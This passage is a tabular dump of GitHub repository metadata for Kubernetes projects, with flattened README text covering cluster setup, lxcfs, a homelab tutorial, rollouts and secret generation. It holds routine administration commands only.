Ingress Control root linux node1 kubectl get node NAME STATUS ROLES AGE VERSION linux node1 example com Ready master 120m v1 18 3 linux node2 example com Ready 113m v1 18 3 linux node3 example com Ready 108m v1 18 3 root linux node1 kubectl label nodes linux node2 example com edgenode true root linux node1 kubectl create f srv addons traefik ingress 2 Helm3 HELMKubernetesHelmKubernetes 1 Helm root linux node1 cd usr local src root linux node1 src wget https get helm sh helm v3 2 4 linux amd64 tar gz root linux node1 src tar zxf helm v3 2 4 linux amd64 tar gz root linux node1 src mv linux amd64 helm usr local bin 2 root linux node1 helm version version BuildInfoVersion v3 2 4 GitCommit b29d20baf09943e134c2fa5e1e1cab3bf93315fa GitTreeState clean GoVersion go1 13 7 Kubernetes 1 SSH root linux node1 ssh copy id linux node4 2 etc salt roster root linux node1 vim etc salt roster linux node4 host 192 168 56 14 user root priv root ssh idrsa minionopts grains k8s role node 3 SaltStacksalt ssh state highstate root linux node1 salt ssh linux node4 state highstate,2020-10-28T14:06:57Z,2020-11-18T08:36:22Z,SaltStack,User,1,1,0,8,master,voilet,1,0,0,0,0,0,0
asppj,k8sctl,,,2020-12-03T12:08:24Z,2020-12-03T12:38:29Z,n/a,User,1,1,0,0,main,,0,0,0,0,0,0,0
fakehydra,k8s-study,,some tar gz from k8s,2020-10-16T01:24:12Z,2020-12-07T02:39:40Z,n/a,User,1,1,0,1,main,fakehydra,1,0,0,0,0,0,0
jicki,k8s-lxcfs,,k8s lxcfs https github com lxc lxcfs lxcfs proc uptime node proc cpuinfo proc diskstats proc meminfo proc stat proc swaps proc uptime sys devices system cpu online lxcfs lxcfs node lxcfs centos yum install fuse fuse lib fuse devel git clone https github com lxc lxcfs cd lxcfs bootstrap sh configure make make install lxcfs sudo mkdir p var lib lxcfs sudo lxcfs var lib lxcfs systemctl cat usr lib systemd system lxcfs service EOF Unit Description lxcfs Service ExecStart usr bin lxcfs f var lib lxcfs Restart on failure ExecReload bin kill s SIGHUP MAINPID Install WantedBy multi user target EOF systemctl daemon reload systemctl start lxcfs systemctl status lxcfs Docker lxcfs alpine alpine docker run it m 256m memory swap 256m v var lib lxcfs proc cpuinfo proc cpuinfo rw v var lib lxcfs proc diskstats proc diskstats rw v var lib lxcfs proc meminfo proc meminfo rw v var lib lxcfs proc stat proc stat rw v var lib lxcfs proc swaps proc swaps rw v var lib lxcfs proc uptime proc uptime rw v var lib lxcfs proc slabinfo proc slabinfo rw ubuntu 18 04 bin bash Kubernetes lxcfs lxcfs dockerfile FROM ubuntu 18 04 as build RUN apt update y RUN apt get purge remove lxcfs RUN apt install y wget git libtool m4 autotools dev automake pkg config build essential libfuse dev libcurl4 openssl dev libxml2 dev mime support ENV LXCFSVERSION 4 0 6 RUN wget https github com lxc lxcfs archive lxcfs LXCFSVERSION tar gz mkdir lxcfs tar xzvf lxcfs LXCFSVERSION tar gz C lxcfs strip components 1 cd lxcfs bootstrap sh configure make FROM ubuntu 18 04 STOPSIGNAL SIGINT COPY from build lxcfs src lxcfs usr local bin lxcfs COPY from build lxcfs src libs liblxcfs so usr local lib lxcfs liblxcfs so COPY from build lxcfs src liblxcfs la usr local lib lxcfs liblxcfs la COPY from build lxcfs src lxcfs lxcfs lxcfs COPY from build lxcfs src libs liblxcfs so lxcfs liblxcfs so COPY from build lxcfs src liblxcfs la lxcfs liblxcfs la COPY from build lib x8664 linux gnu libfuse so 2 9 7 usr lib64 libfuse so 2 9 7 COPY from build lib x8664 linux gnu libulockmgr so 1 0 1 usr lib64 libulockmgr so 1 0 1 RUN ln s usr lib64 libfuse so 2 9 7 usr lib64 libfuse so 2 ln s usr lib64 libulockmgr so 1 0 1 usr lib64 libulockmgr so 1 COPY start sh RUN chmod x start sh CMD start sh start sh bin bash Cleanup nsenter m proc 1 ns mnt fusermount u var lib lxcfs 2 dev null true nsenter m proc 1 ns mnt L etc mtab sed i lxcfs var lib lxcfs fuse lxcfs d etc mtab Prepare mkdir p usr local lib lxcfs var lib lxcfs Update lxcfs cp f lxcfs lxcfs usr local bin lxcfs cp f lxcfs liblxcfs so usr local lib lxcfs liblxcfs so cp f lxcfs liblxcfs la usr local lib lxcfs liblxcfs la Mount exec nsenter m proc 1 ns mnt usr local bin lxcfs var lib lxcfs enable cfs l Kubernetes lxcfs k8s lxcfs k8s lxcfs k8s daemonset kubectl apply f lxcfs daemonset yaml openbayes initializer kubernetes io lxcfs true initializer k8s 1 14 alpine yaml apiVersion apps v1 kind Deployment metadata labels app web name web spec replicas 1 selector matchLabels app web template metadata labels app web spec containers name web image httpd 2 4 32 resources requests memory 2Gi cpu 2000m limits memory 2Gi cpu 2000m volumeMounts lxcfs volumeMounts name lxcfs proc cpuinfo mountPath proc cpuinfo name system cpu online mountPath sys devices system cpu online name lxcfs proc meminfo mountPath proc meminfo name lxcfs proc diskstats mountPath proc diskstats name lxcfs proc stat mountPath proc stat name lxcfs proc swaps mountPath proc swaps name lxcfs proc uptime mountPath proc uptime volumes lxcfs volumes name lxcfs proc cpuinfo hostPath path var lib lxcfs proc cpuinfo type File name system cpu online hostPath path var lib lxcfs sys devices system cpu online type File name lxcfs proc diskstats hostPath path var lib lxcfs proc diskstats type File name lxcfs proc meminfo hostPath path var lib lxcfs proc meminfo type File name lxcfs proc stat hostPath path var lib lxcfs proc stat type File name lxcfs proc swaps hostPath path var lib lxcfs proc swaps type File name lxcfs proc uptime hostPath path var lib lxcfs proc uptime type File free kubectl exec web fb779ff47 wts5l free total used free shared buffers cached Mem 2097152 10508 2086644 264 0 264 buffers cache 10244 2086908 Swap 0 0 0 top cpu top 02 59 50 up 3 min 0 users load average 0 48 0 94 1 10 Tasks 6 total 1 running 5 sleeping 0 stopped 0 zombie Cpu0 0 0 us 0 0 sy 0 0 ni 100 0 id 0 0 wa 0 0 hi 0 0 si 0 0 st Cpu1 0 0 us 0 0 sy 0 0 ni 100 0 id 0 0 wa 0 0 hi 0 0 si 0 0 st KiB Mem 2097152 total 12068 used 2085084 free 0 buffers KiB Swap 0 total 0 used 0 free 264 cached Mem PID USER PR NI VIRT RES SHR S CPU MEM TIME COMMAND 1 root 20 0 79292 4316 3524 S 0 0 0 2 0 00 05 httpd 7 daemon 20 0 368472 3524 2404 S 0 0 0 2 0 00 00 httpd 8 daemon 20 0 368472 3524 2404 S 0 0 0 2 0 00 00 httpd 9 daemon 20 0 368472 3524 2404 S 0 0 0 2 0 00 00 httpd 115 root 20 0 20264 3244 2740 S 0 0 0 2 0 00 00 bash 122 root 20 0 21948 2448 2092 R 0 0 0 1 0 00 00 top,2020-12-15T09:03:35Z,2020-12-16T08:18:59Z,Shell,User,1,1,0,1,main,jicki,1,0,0,0,0,0,0
wenshilin,k8s-benchmark,,k8s benchmark,2020-10-29T02:37:17Z,2020-12-29T07:55:53Z,Python,User,2,1,0,173,main,wenshilin#lgasyou,2,0,0,0,0,0,0
GreyRook,k8ssco,,,2020-09-23T20:01:07Z,2020-09-24T08:07:50Z,Shell,Organization,1,1,0,1,master,FlorianLudwig,1,0,0,0,0,0,0
tepnimitl,k8s-manifests,,Pre req kubectl Apply manifest files kubectl apply f yaml Show K8s kubectl get all,2020-10-09T19:22:33Z,2020-10-19T13:14:59Z,n/a,User,1,1,0,6,master,tepnimitl,1,0,0,0,0,0,0
chandankumar01,multi-k8s,,,2020-10-16T13:49:10Z,2020-10-22T13:18:27Z,JavaScript,User,1,1,0,14,master,chandankumar01#p00gz,2,0,0,0,0,0,1
brauliogr,k8s-appwork,,Build Status https kubernetes io images navlogo2 svg branch master https kubernetes io Deployment Appwork at Kubernetes Build Status https travis ci org joemccann dillinger svg branch master https travis ci org joemccann dillinger Este um projeto para a cria o da aplica o appwork rodando em Kubernetes Criando Volumes Deployment e Services do banco de dados Mongodb kubectl create f mongo pv yml kubectl create f mongo pvc yml kubectl create f mongo deploy yml kubectl create f mongo service yml Criando Deployment e Services da aplica o kubectl create f appworkwebdeploy yml kubectl create f appworkweb service yml Criando Ingress Nginx Entre no diretrio do ingress e crie os deployments services roles e configmap utilizando o kubectl usando o namespace ingress kubectl create f defaut backend yml n ingress kubectl create f defaut backend service yml n ingress kubectl create f nginx ingress controller config map yml kubectl create f nginx ingress controller roles yaml kubectl create f nginx ingress controller deployment yml kubectl create f nginx ingress controller service yml Edite o arquivo appserver para alterar o endereo do host aps alterar crie o ingress kubectl create f appserver yml,2020-10-11T23:16:20Z,2020-12-14T01:35:46Z,n/a,User,1,1,0,7,main,brauliogr,1,0,0,0,0,0,0
reversondias,k8s_lab,,K8s Lab This is a ansible automation based on https github com kelseyhightower kubernetes the hard way Using Hashi Corp Vagrant to provisioning VMs in VirtualBox,2020-10-05T00:18:51Z,2020-12-13T20:40:49Z,HTML,User,1,1,0,17,master,reversondias,1,0,0,0,0,0,0
davidasnider,icinga_k8s,,Intro This is Icinga designed for Kubernetes instead of Docker Compose Updating Versions Unfortunately the build on arm using buildkit fails with GitHub actions Therefore to update to a new version of Icinga update the docker build sh file with the new versions Then merge the changes and run the script on an arm based system Deployment image diagram svg Local 1 Select the proper k8s environment 1 kubectl config us context docker for desktop 1 Run the below script kubectl delete k local dev kubectl apply k local dev Dev 1 Select the proper k8s environment 1 kubectl config us context k8s1 1 Run the below script kubectl delete k secondary kubectl apply k secondary Prod 1 Select the proper k8s environment 1 kubectl config us context k8s2 1 Run the below script kubectl delete k primary kubectl apply k primary,2020-11-07T17:37:07Z,2020-12-27T02:14:57Z,PLpgSQL,User,1,1,0,36,main,davidasnider#github-actions[bot]#dependabot[bot],3,0,0,0,0,0,14
kalkayan,k8s.elections,community-elections#k8s#kubernetes#kubernetes-community,banner js static banner jpg k8s elections is an opensource organization wide application for conducting community elections It provides the necessary support for conducting elections with security k8s elections is built upon the CIVS s voting logic know as Condorcet method and has an ability to extend to other logics as well To start using k8s elections See our detailed instruction docs docs README md To start developing k8s elections See the application s design and architecture documentation docs DESIGN md that has all information about building k8s elections from source how to contribute code and documentation who to contact about what etc The repository contains an conda environment yml file for creating virtual environment refer to conda docs https docs conda io projects conda en latest user guide tasks manage environments html and also has an requirements txt for pip usage bash Installation with pip pip install r requirements txt Installation with Conda conda env create f environment yml conda activate k8s To run the flask local server use the console script in the repository The flask server will start on 5000 by default but can be changed using port option bash to run the server on default configs python console to change host and port python console port 8080 host 0 0 0 0 to migrate the database from command line python console migrate Support if you have questions reach out to us one way or another,2020-10-22T23:06:05Z,2020-12-29T13:11:47Z,Python,User,2,1,0,46,main,kalkayan,1,0,0,3,1,1,1
rebootedcqwe,k8s2,,,2020-08-24T07:36:34Z,2020-09-07T05:40:32Z,Shell,User,1,1,0,7,master,rebootedcqwe,1,0,0,0,0,0,0
trolleksii,k8s-homelab,kubernetes#kubernetes-bare-metal#lab-environment#playground,K8s homelab If you have an old laptop lying around gathering dust you can give it a second life by creating a one node bare metal Kubernetes cluster as a local lab for practice Overview There are many other tools that can quickly spin up a dispensable one node cluster minikube microk8s kind etc and enable many popular apps plugins with a single command Although in my humble opinion they target developers as the primary audience having speed and simplicity of spinning up the local dev environment as the main goal While it is awesome that we have them all they might not be the best tools for Kubernetes explorers who lean towards the Ops side The approach described in this tutorial is appealing due to the following reasons 1 Having a cluster on a physical device allows to have a simpler mental model of the environment and will make a good foundation to start exploring Kubernetes bootstrap process building blocks runtimes networking plugins host related settings etc 2 It won t consume your primary device client resources 3 You can keep it always on No need to stop destroy the cluster when you re done working and then re create it when needed Just halt your cluster by simply closing the lid and resume by opening the lid 4 You don t have to pay your cloud provider for the lab environment you might use only for a few hours a day while still having nice perks of having a cloud based setup LoadBalancer Persistent Volumes 5 It is DIY and simply a fun thing to do Prerequisites 1 Your laptop should have a static IP Otherwise every time you reboot it you ll have to adjust kubeconfig with a new IP address 2 Your local network must have a range of IPs available for static assignment not served by DHCP server Those IPs will be used as your cluster s LoadBalancer IPs so you won t need too many 3 A If you want to open access to your apps from the internet over https your home router must have a public IP address assigned by the ISP and it should be able to do Port Forwarding Besides that you will need a domain name with a single wildcard A record that would point to your router s public IP B If you can t or don t want to expose your apps to the internet but still want to use domain names to access your apps within your LAN you ll need a local DNS server OS Installation This tutorial was created using Ubuntu Server 20 04 LTS https ubuntu com download server option 3 to download Due to the fact that it aims at using eBPF mode with the networking plugin it will need Linux kernel version 5 13 or later or Linux kernel v4 18 0 193 or above if using Red Hat v8 2 Other Linux distributions can be used as long as this requirement is met Linux kernel version 5 3 or later and installation commands are adjusted accordingly You can also choose the Linux distro with an older kernel and just comment blocks of code related to the eBPF configuration The installation procedure of Ubuntu Server 20 04 has nothing special about it You don t need to install anything except OpenSSH server The only noticeable mention is that you will need to create one dedicated disk volume for Kubernetes Persistent Volumes so make sure you create one during disk layout Choosing the right volume size depends on how much data you are going to store in your persistent volumes The volume should be ext4 formatted but without a mount point OS Configuration First you will need a container runtime installed I prefer to use Containerd https github com containerd containerd but you can use Docker https docs docker com get docker or cri o https cri o io instead if you want SH sudo apt get install y containerd Next you will need to load brnetfilter kernel module You will also need to tune following values for the kernel s bridge and ipv4 modules in order to pass the kubeadm pre flight validations SH sudo modprobe brnetfilter echo brnetfilter sudo tee a etc modules load d modules conf cat EOF sudo tee etc sysctl d k8s conf net bridge bridge nf call ip6tables 1 net bridge bridge nf call iptables 1 net ipv4 ipforward 1 EOF sudo sysctl system To make your cluster feel like a real thing you will need Persistent Volumes provisioner Local Persistence Volume Static Provisioner https github com kubernetes sigs sig storage local static provisioner is an awesome SIG project that will just do the thing for you without complicating it too much That s why you created that unused disk volume during OS setup Assuming that volume path is dev sda4 the setup would be following Create a directory for provisioner discovery SH sudo mkdir p mnt fast disks Identify your disk partition device path knowing the disk type and size you can easily do so with SH sudo fdisk l or SH lsblk Format and mount your volume edit the DISKPATH variable SH DISKPATH dev sda3 yes sudo mkfs ext4 DISKPATH DISKUUID blkid s UUID o value DISKPATH sudo mkdir p mnt DISKUUID sudo mount t ext4 DISKPATH mnt DISKUUID Add persistent mount entry to the etc fstab SH echo UUID DISKUUID mnt DISKUUID ext4 defaults 0 2 sudo tee a etc fstab Create multiple directories and bind mount them into discovery directory Each of those will contain a PV content so if you need more than 20 PVs feel free to adjust the number in the loop SH for i in seq 1 20 do sudo mkdir p mnt DISKUUID vol i mnt fast disks DISKUUIDvol i sudo mount bind mnt DISKUUID vol i mnt fast disks DISKUUIDvol i done Now just add persistent bind mount entries to the etc fstab SH for i in seq 1 20 do echo mnt DISKUUID vol i mnt fast disks DISKUUIDvol i none bind 0 0 sudo tee a etc fstab done Finally you MUST disable swap in order for the kubelet to work properly SH sudo swapoff a Make laptop display to turn off when not in use Ubuntu Server by default will keep your display always on even if you are not logged in To fix this you need to edit the etc default grub SH sudo nano etc default grub and set following variable GRUBCMDLINELINUXDEFAULT quiet consoleblank 60 The update grub and reboot SH sudo update grub sudo reboot Installing packages and CLI tools First you ll need tools to bootstrap the cluster and interact with it Those tools are kubeadm https kubernetes io docs reference setup tools kubeadm for cluster creation kubelet and kubectl SH sudo apt get update sudo apt get install y apt transport https curl jq curl s https packages cloud google com apt doc apt key gpg sudo apt key add cat EOF sudo tee etc apt sources list d kubernetes list deb https apt kubernetes io kubernetes xenial main EOF sudo apt get update sudo apt get install y kubelet kubeadm kubectl sudo apt mark hold kubelet kubeadm kubectl If you want to install a specific version of Kubernetes you can specify the version for each package SH KUBERNETESVERSION 1 18 10 00 sudo apt get install y kubectl KUBERNETESVERSION kubeadm KUBERNETESVERSION kubelet KUBERNETESVERSION sudo apt mark hold kubelet kubeadm kubectl In absence of docker you might need a tool to interact with images and containers in your system Conveniently one of kubeadm dependencies cri tools will be installed along with kubeadm Though to make it fully functional you need to create a config that will point it to the containerd socket file SH cat EOF sudo tee etc crictl yaml runtime endpoint unix run containerd containerd sock image endpoint unix run containerd containerd sock timeout 10 EOF After that you can use crictl to manage containers on the host SH NAME crictl client for CRI USAGE crictl global options command command options arguments VERSION v1 13 0 COMMANDS attach Attach to a running container create Create a new container exec Run a command in a running container version Display runtime version information images List images inspect Display the status of one or more containers inspecti Return the status of one or more images inspectp Display the status of one or more pods logs Fetch the logs of a container port forward Forward local port to a pod ps List containers pull Pull an image from a registry runp Run a new pod rm Remove one or more containers rmi Remove one or more images rmp Remove one or more pods pods List pods start Start one or more created containers info Display information of the container runtime stop Stop one or more running containers stopp Stop one or more running pods update Update one or more running containers config Get and set crictl options stats List container s resource usage statistics completion Output bash shell completion code help h Shows a list of commands or help for one command If you want to enable eBPF mode in Calico you will also need calicoctl https docs projectcalico org getting started clis calicoctl install cli tool SH CALICOCTLVERSION 3 16 3 sudo curl o usr local bin calicoctl L https github com projectcalico calicoctl releases download v CALICOCTLVERSION calicoctl sudo chmod x usr local bin calicoctl Create the cluster Now when all preparations are done we are ready to begin Each of the following scripts is based on the default or close to default configuration and suited with comments describing performed steps Once you feel confident with what s going on in them you can dive deep into involved component and customize them according to your goal 1 Adjust variables in setup envvars with values that are relevant to your environment SH vi setup envvars 2 Bootstrap the cluster SH setup kube sh 3 Install the Calico networking plugin SH setup calico sh 4 Install LoadBalancer IP provisioner SH setup metallb sh 5 Install PersistentVolumes provisioner SH setup pvp sh 6 Install the Metrics Server This will allow you to use the Horizontal Pod Autoscaler or simply get resource utilization with kubectl top command SH setup mertics sh That makes the backbone of your new shiny cluster All following configurations will be from your client device Client device setup The following steps should be performed on each client device which you intend to use to work with your new cluster 1 Create update the kubeconfig Option A If you this is the only cluster you have at the moment just copy the kubeconfig content to your client device ssh On the server device Kubernetes laptop and copy the config file to your client device SH scp kube config kube config Option B If you are managing multiple clusters from this device you ll need to create a new cluster context and user entries in your current kubeconfig Start with copying your kubeconfig to the client device SH scp kube config tmp newkubeconfig Then create required entries This step uses yq to parse kubeconfig you can install it using snap snap install yq or brew brew install yq SH cd tmp CLUSTERIP cat newkubeconfig yq r clusters 0 cluster server cat newkubeconfig yq r clusters 0 cluster certificate authority data base64 d k8s ca pem cat newkubeconfig yq r users 0 user client certificate data base64 d k8s user cert pem cat newkubeconfig yq r users 0 user client key data base64 d k8s user key pem kubectl config set cluster homelab server CLUSTERIP certificate authority k8s ca pem embed certs kubectl config set credentials homelab admin client certificate k8s user cert pem client key k8s user key pem embed certs kubectl config set context homelab admin homelab cluster homelab user homelab admin kubectl config use context homelab admin homelab rm f k8s ca pem k8s user cert pem k8s user key pem newkubeconfig 2 Install kubectl Linux SH curl s https packages cloud google com apt doc apt key gpg sudo apt key add cat EOF sudo tee etc apt sources list d kubernetes list deb https apt kubernetes io kubernetes xenial main EOF sudo apt get update sudo apt get install kubectl Mac SH brew install kubectl 3 Install the Helm https helm sh docs intro install package manager Linux SH HELMVERSION 3 3 4 curl LO https get helm sh helm v HELMVERSION linux amd64 tar gz tar zxvf helm v HELMVERSION linux amd64 tar gz sudo mv linux amd64 helm usr local bin helm rm Rf helm v HELMVERSION linux amd64 tar gz linux amd64 Mac SH HELMVERSION 3 3 4 curl LO https get helm sh helm v HELMVERSION darwin amd64 tar gz tar zxvf helm v HELMVERSION darwin amd64 tar gz sudo mv darwin amd64 helm usr local bin helm rm Rf helm v HELMVERSION darwin amd64 tar gz darwin amd64 Provisioning essential tools Now that both server and client are configured it is time to provision some essential tools that will provide you a convenient and consistent way of accessing apps in your cluster One way to do this is to use an Edge Router to accept all requests into your cluster and them forward them to the desired app component based on some criteria such as host or path of the request Traefik https doc traefik io traefik is an example of such router It is easy to install and work with and has a plenty of features Depending on either you chose to keep your cluster private or expose it to the internet you would pick one of two options described below Option A Private cluster When your cluster is private you can t issue certificates dynamically using ACME provider You could bootstrap a PKI with tools like Hashicorp Vault but that would be an overkill for a home lab like this unless that is exactly what you want to do There is an easier way to solve certificates problem issue a single wildcard certificate with some cli tool and configure it as Traifik s default Cloudflare s cfssl https github com cloudflare cfssl is an awesome tool that can help you with that First you ll need the binary if you don t have it yet SH CFSSLVERSION 1 4 1 sudo curl L o usr local bin cfssl https github com cloudflare cfssl releases download v CFSSLVERSION cfssl CFSSLVERSIONlinuxamd64 sudo curl L o usr local bin cfssljson https github com cloudflare cfssl releases download v CFSSLVERSION cfssljson CFSSLVERSIONlinuxamd64 sudo chmod x usr local bin cfssl usr local bin cfssljson Generate a CA config CA certificate and private key SH cat EOF tee config json signing default expiry 87600h profiles default usages signing key encipherment server auth client auth expiry 17520h EOF cat EOF tee ca csr json CN K8S Lab CA key algo ecdsa size 521 names O Home Lab EOF cfssl gencert initca ca csr json cfssljson bare ca rm f ca csr json The CA certificate ca pem generated with the command needs to be distributed across your client devices and added to the system s trusted certificates This will remove certificate related security warnings from your browsers and apps On Mac you would import it into the keychain On Linux you will need to update system certificate store will make your curl work and nssdb used by Chrome Mozilla SH sudo cp ca pem usr local share ca certificates homelab crt sudo update ca certificates sudo apt get install y libnss3 tools certutil d sql HOME pki nssdb A t C n homelab i ca pem Next step is to generate a single wildcard certificate to cover all apps of your home lab domain Change example com to domain name of your choice SH cat EOF tee traefik json CN Traefik Wildcard key algo ecdsa size 256 names O Home Lab hosts example com 127 0 0 1 EOF cfssl gencert ca ca pem ca key ca key pem config config json profile default traefik json cfssljson bare traefik rm f tra,2020-10-10T02:07:25Z,2020-11-06T01:26:30Z,Shell,User,2,1,0,26,main,trolleksii#Adeelku,2,0,0,0,0,0,4
shlomimn,K8s-rollout,,K8s rollout Target Show how to role back with kubectl Steps Create Deployment yaml for a pod with image of nginx 1 7 9 with 2 replicasets kubectl create deployment my deploy image nginx 1 7 9 replicas 2 port 80 o yaml dry run deployment yaml kubectl apply f deployment yaml record At this point the following are created kubectl get deployments apps NAME READY UP TO DATE AVAILABLE AGE nginx deploy 2 2 2 2 2m16s kubectl get replicasets apps NAME DESIRED CURRENT READY AGE nginx deploy 5d59d67564 2 2 2 2m18s kubectl get pods NAME READY STATUS RESTARTS AGE nginx deploy 5d59d67564 2zvpz 1 1 Running 0 2m21s nginx deploy 5d59d67564 8pqfz 1 1 Running 0 2m21s Now the image version is changed to nginx latest kubectl apply f deployment yaml record The old pods are terminated and the new pods take place kubectl get pod NAME READY STATUS RESTARTS AGE nginx deploy 5d59d67564 2zvpz 0 1 Terminating 0 64s nginx deploy 5d59d67564 8pqfz 0 1 Terminating 0 61s nginx deploy 75b69bd684 6jgp2 1 1 Running 0 11s nginx deploy 75b69bd684 mxggs 1 1 Running 0 9s Check rollout history kubectl rollout history deployment deployment apps nginx deploy REVISION CHANGE CAUSE 1 kubectl apply filename deployment yaml record true 2 kubectl apply filename deployment yaml record true Now roll back to revision 2 kubectl rollout undo deployment nginx deploy to revision 2 deployment apps nginx deploy rolled back kubectl get pod NAME READY STATUS RESTARTS AGE nginx deploy 5d59d67564 22cvb 0 1 ContainerCreating 0 3s nginx deploy 5d59d67564 sl5nf 1 1 Running 0 6s nginx deploy 75b69bd684 6jgp2 1 1 Running 0 2m59s nginx deploy 75b69bd684 mxggs 0 1 Terminating 0 2m57s,2020-11-01T04:42:38Z,2020-11-01T05:21:21Z,n/a,User,1,1,0,5,master,shlomimn,1,0,0,0,0,0,0
kylemocode,k8s-prac,,,2020-12-27T16:01:08Z,2020-12-27T17:31:53Z,JavaScript,User,1,1,0,5,main,p00gz#kylemocode,2,0,0,0,0,0,0
prudhvi34,K8SPractice,,K8SPractice,2020-09-17T04:41:42Z,2020-09-26T01:59:54Z,n/a,User,1,1,0,5,master,prudhvi34,1,0,0,0,0,0,0
jankaderabek,k8s-multi,,,2020-09-24T17:08:15Z,2020-09-25T07:41:44Z,Shell,User,1,1,0,15,master,jankaderabek,1,2,2,1,0,1,1
nibocn,k8s-learn,,,2020-09-24T07:46:57Z,2020-10-20T09:58:38Z,Shell,User,2,1,0,9,master,nibocn,1,0,0,0,0,0,0
desperadochn,k8s-watcher,,,2020-10-17T17:30:46Z,2020-10-18T04:51:17Z,Go,User,1,1,0,5,master,desperadochn,1,0,0,0,0,0,0
zhangnianyi,k8s-client,,,2020-12-10T01:45:39Z,2020-12-14T08:14:47Z,Go,User,1,1,0,5,main,zhangnianyi,1,0,0,0,0,0,0
mobile-core,k8s-mobilenetworks,,k8s mobilenetworks,2020-12-14T04:44:30Z,2020-12-14T13:05:56Z,n/a,User,1,1,0,1,master,mobile-core,1,0,0,0,0,0,0
luka-rmar,practice-k8s,,,2020-11-15T21:08:14Z,2020-12-25T02:50:45Z,n/a,User,1,1,0,0,master,,0,0,0,0,0,0,0
Pankajazlearn,terraform-k8s,,go isatty isatty for golang Usage go package main import fmt github com mattn go isatty os func main if isatty IsTerminal os Stdout Fd fmt Println Is Terminal else fmt Println Is Not Terminal Installation go get github com mattn go isatty License MIT Author Yasuhiro Matsumoto a k a mattn,2020-09-15T23:05:18Z,2020-09-15T23:12:37Z,Go,User,1,1,0,1,master,Pankajazlearn,1,0,0,0,0,0,0
aytitech,k8sfundamentals,,k8sfundamentals Kubernetes Fundamentals training created by ayti tech,2020-10-22T19:33:25Z,2020-10-22T23:55:52Z,n/a,Organization,0,1,0,1,main,ozgurozturknet,1,0,0,0,0,0,0
bygui86,k8s-reloader,,k8s reloader Example of how to use stakater Reloader https github com stakater Reloader in Kubernetes to trigger Pods restart upon ConfigMaps and Secrets updates Prerequisites Kubernetes cluster Minikube https minikube sigs k8s io docs start or anything else Kustomize https kustomize io installed locally Instructions 1 Prepare environment 1 If you don t have the Kubernetes cluster already running spin it up shell script minikube start cpus 4 memory 8192 1 Deploy Reloader shell script kustmize build reloader kubectl apply f 1 Create ConfigMap V1 shell script kubectl apply f configmap v1 yaml 1 Create Secret V1 shell script kubectl apply f secret v1 yaml 1 Create Deployment shell script kubectl apply f deployment yaml 1 Open a second terminal to watch pods shell script watch kubectl get pods 1 Open a third terminal to watch logs of Reloader controller shell script kubectl logs n reloader k get pods l app reloader n reloader grep v NAME awk print 1 f 1 Till here everything should work normally 2 Update ConfigMap test 1 Update ConfigMap to V2 shell script kubectl apply f configmap v2 yaml 1 Very soon you should observe a pod restart in the second terminal in the third terminal some logs like time 2020 11 12T09 31 42Z level info msg Changes detected in kubectl of type CONFIGMAP in namespace default time 2020 11 12T09 31 42Z level info msg Updated busybox of type Deployment in namespace default 3 Update Secret test 1 Update Secret to V2 shell script kubectl apply f secret v2 yaml 1 Very soon you should observe a pod restart in the second terminal in the third terminal some logs like time 2020 11 12T09 28 38Z level info msg Changes detected in kubectl of type SECRET in namespace default time 2020 11 12T09 28 38Z level info msg Updated busybox of type Deployment in namespace default,2020-11-12T09:57:42Z,2020-11-15T16:35:14Z,n/a,User,1,1,0,1,main,bygui86,1,0,0,0,0,0,0
fabiofernandesx,k8s-volumes,,k8s volumes Persistent Volumes Configuration in Kubernetes using NFS,2020-11-27T16:38:24Z,2020-12-17T22:47:48Z,HTML,User,1,1,0,3,main,fabiofernandesx,1,0,0,0,0,0,1
dealroadshow,k8s-resources,,Dealroadshow k8s resources This repository contains PHP classes corresponding to Kubernetes API definitions Classes in this repository are generated with kodegen https github com dealroadshow kodegen tool This repository does not use semantic versioning since it must define different sets of classes for different Kubernetes API versions Therefore in order to install PHP classes for Kubernetes API v1 16 use v1 16 release of this library This is a low level library so in order to get a maximum of functionality and convenience for writing your Kubernetes manifests use dealroadshow k8s framework https github com dealroadshow k8s framework or dealroadshow k8s bundle https github com dealroadshow k8s bundle which integrates dealroadshow k8s framework https github com dealroadshow k8s framework with Symfony 5,2020-10-06T19:25:59Z,2020-12-23T18:47:28Z,PHP,Organization,3,1,0,6,v1.16,petr-buchin#petr-buchyn,2,3,3,0,0,0,1
laebshade,k8s-gitops,,k8s gitops,2020-09-19T22:48:38Z,2020-09-20T03:27:24Z,n/a,User,1,1,0,9,master,laebshade,1,0,1,0,0,0,0
wapert,k8sClient,,k8sClient Golang K8s client using client go API to add and remove endpoints of kubernetes services,2020-10-13T10:54:26Z,2020-10-14T02:50:23Z,Go,User,1,1,0,5,main,wapert,1,0,0,0,0,0,0
amarildolacerda,k8s-firebirdwebadmin,,k8s firebirdwebadmin Deployment Firebird para Kubernets Ao fazer APPLY ser criado um servio no Kubenetes com nome fb webadmin acessvel pela porta 80 Cria servio na porta 80 para interface de administra o remota firebird Utiliza o docker marianaldenhoevel firebirdwebadmin para subir o Deployment no Kubernetes kubectl apply f firebirdwebadmin yaml para acesssar o terminal do POD kubectl exec stdin tty bin bash para ver MeusPods kubectl get pods output wide para ver o Services kubectl get services,2020-09-03T00:23:11Z,2020-09-03T01:31:09Z,Batchfile,User,1,1,0,6,master,amarildolacerda,1,0,0,0,0,0,0
baspenny,k8s_secretgenerator,,Kubernetes Secret Generator This package contains a nice and convienient class to create Kubernetes secret files It can create secrets from env files or from files using the absolute path of the file and reading them installation pip install k8s secretgenerator Examples Below two examples One for creation of secrets from files like eg service account credentials or other files you want in a variable for Kubernetes The other one is an example to generate a secret file from a env file All values will be base64 encoded just the way Kubernetes likes them python Example import os namespace your awesome namespace Define file input credentials secretname google credentials namespace namespace type Opaque inputfiles Please use the absolute path for input name serviceaccount json path secrets serviceaccount json Define env file input envfiles secretname env vars namespace namespace type Opaque Please use the absolute path for input inputfile env Please use the absolute path for output manifestgenerator ManifestGenerator outputdir secrets manifestgenerator createfromfiles credentials manifestgenerator createfromenvfiles envfiles,2020-10-22T08:58:57Z,2020-10-26T12:31:18Z,Python,User,1,1,0,1,main,baspenny,1,0,0,0,0,0,0
levdy,k8s-ansible,,,2020-11-03T14:31:36Z,2020-11-03T14:46:15Z,Shell,User,1,1,0,0,master,,0,0,0,0,0,0,0
